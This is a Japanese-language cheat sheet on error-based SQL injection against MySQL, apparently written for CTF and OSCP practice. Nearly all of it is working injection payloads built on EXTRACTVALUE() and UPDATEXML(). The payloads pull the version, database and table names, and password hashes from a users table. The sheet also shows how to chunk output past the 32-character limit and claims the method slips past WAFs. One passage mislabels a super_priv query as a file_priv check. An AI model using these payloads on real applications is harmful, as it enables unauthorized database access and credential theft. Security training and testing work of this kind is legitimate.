`EXTRACTVALUE()` を利用した SQL インジェクションは、**Error-Based SQLi（エラーベース）** の代表的な手法です。

MySQL の XML 関数である `EXTRACTVALUE()` は、第 2 引数の XPath 形式が不正な場合に、その不正な文字列をエラーメッセージに含めて表示するという性質があります。これを利用して、抽出したいデータをエラーメッセージとして画面に吐き出させます。

---

## EXTRACTVALUE SQLi 基本チートシート

### 1. 攻撃の基本構造

XPath として不正な文字（一般的に `~` すなわち `0x7e`）を先頭に結合することで、エラーを誘発させます。

```sql
# 基本形
' AND (SELECT 1 FROM (SELECT EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 実行したいクエリ), 0x7e)))x)-- -

```

### 2. 情報収集ステップ

| 取得対象 | ペイロード (クエリ部分) |
| --- | --- |
| **バージョン** | `EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))` |
| **ユーザー** | `EXTRACTVALUE(1, CONCAT(0x7e, USER()))` |
| **DB名** | `EXTRACTVALUE(1, CONCAT(0x7e, DATABASE()))` |
| **テーブル一覧** | `EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))` |
| **カラム一覧** | `EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users')))` |

---

## 3. 非常に重要な制限：32文字の壁

`EXTRACTVALUE()` がエラーで表示できるのは **最大32文字** までです。これを超えるデータ（長いハッシュ値や大量のテーブル名など）を取得するには、`SUBSTR()` や `MID()` を使って分割して取得する必要があります。

### 分割取得の例（31文字目から取得）

```sql
' AND (SELECT 1 FROM (SELECT EXTRACTVALUE(1, CONCAT(0x7e, SUBSTR((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables), 31, 30))))x)-- -

```

---

## 4. 実戦的なペイロード例

### ① データベース名の特定

```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database())))-- -
# 結果例: XPATH syntax error: '~target_db'

```

### ② ユーザー情報の抽出（パスワードハッシュなど）

```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTR(password,1,30) FROM users LIMIT 1)))-- -
# 結果例: XPATH syntax error: '~hash_value_part_1...'

```

### ③ 権限の確認

自分が `file_priv` を持っているか（ファイル読み書きが可能か）を確認します。

```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT super_priv FROM mysql.user WHERE user='root' LIMIT 1)))-- -

```

---

## 5. 類似手法：UPDATEXML

`EXTRACTVALUE` が対策されている場合や、気分を変えたいときは `UPDATEXML` も全く同じ原理で使えます。

```sql
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e), 1)-- -

```

---

## 💡 CTF/OSCP での使い分け

* **UNIONベースが使えない時:** カラム数が合わない、あるいは画面に 1 行分しか表示スペースがない場合に有効です。
* **ブラインドSQLiよりも高速:** 1 文字ずつ判定する Blind SQLi に比べ、一度に 32 文字取れるため効率が劇的に上がります。
* **WAF回避:** `UNION SELECT` は検知されやすいですが、`EXTRACTVALUE` は XML 処理用関数として見逃されるケースがあります。
